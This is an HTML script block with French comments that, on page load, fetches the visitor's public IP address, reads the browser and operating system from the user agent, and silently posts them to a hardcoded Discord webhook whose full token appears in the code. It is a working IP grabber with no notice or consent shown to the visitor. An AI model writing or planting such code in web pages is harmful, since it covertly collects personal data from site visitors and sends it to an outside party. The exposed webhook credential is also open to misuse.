  <!-- SCRIPT POUR RECUPERER L'IP + NAVIGATEUR + OS ET ENVOYER AU WEBHOOK DISCORD -->
  <script>
    // Fonction pour d√©tecter navigateur et syst√®me
    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browser = "Inconnu";
      if (ua.indexOf("Firefox") > -1) browser = "Firefox";
      else if (ua.indexOf("Chrome") > -1) browser = "Chrome";
      else if (ua.indexOf("Safari") > -1) browser = "Safari";
      else if (ua.indexOf("Edge") > -1) browser = "Edge";
      else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";

      let os = "Inconnu";
      if (ua.indexOf("Win") > -1) os = "Windows";
      else if (ua.indexOf("Mac") > -1) os = "MacOS";
      else if (ua.indexOf("Linux") > -1) os = "Linux";
      else if (ua.indexOf("Android") > -1) os = "Android";
      else if (ua.indexOf("like Mac") > -1) os = "iOS";

      return { browser, os };
    }

    // Fonction pour envoyer au Webhook Discord
    function sendToDiscord(ip, browser, os) {
      fetch("https://discord.com/api/webhooks/1360982570958848120/aNxpZbpZc7--gPfDXX4EuNcPZ1ZI9Ejaj-RXuawhp8Y7QOY3oWh2Iin_bgzA6s6tfwzU", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `Nouvelle connexion :
üåê IP : ${ip}
üñ•Ô∏è Navigateur : ${browser}
üíª Syst√®me : ${os}`
        })
      });
    }

    // Obtenir l'IP publique
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const info = getBrowserInfo();
        sendToDiscord(ip, info.browser, info.os);
      })
      .catch(error => {
        console.error('Erreur de r√©cup√©ration IP:', error);
      });
  </script>
